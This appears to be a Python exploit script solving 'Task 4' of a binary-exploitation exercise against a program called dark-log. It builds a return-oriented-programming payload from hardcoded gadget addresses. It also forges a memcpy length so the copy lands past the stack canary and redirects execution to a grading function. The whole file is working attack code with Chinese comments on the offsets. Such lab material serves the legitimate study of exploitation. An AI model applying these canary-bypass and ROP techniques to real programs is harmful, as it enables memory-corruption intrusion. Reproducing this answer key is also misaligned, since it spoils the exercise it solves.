#!/usr/bin/env python3
"""Task 4: bypass the stack canary in dark-log via the memcpy pivot."""
import sys
import struct

POP_RDI_RET = 0x4018A3     # 5f c3
RET_ALIGN   = 0x4018A4     # c3（pop rdi; ret 后面那个字节）
GRADE_EVAL  = 0x401677

FIXED_LEN   = 0xA8         # 168：让 memcpy 目标 = rbp + 8，正好跳过 canary

chain  = struct.pack("<Q", POP_RDI_RET)
chain += struct.pack("<Q", 4)
chain += struct.pack("<Q", RET_ALIGN)
chain += struct.pack("<Q", GRADE_EVAL)
chain  = chain.ljust(128, b"A")            # expression[0..127]，整段被 memcpy 搬走

payload  = chain                            # 偏移 0..127   expression
payload += b"B" * 128                       # 偏移 128..255 logMsg（随便填）
payload += struct.pack("<i", FIXED_LEN)     # 偏移 256..259 len = 168

sys.stdout.buffer.write(payload)
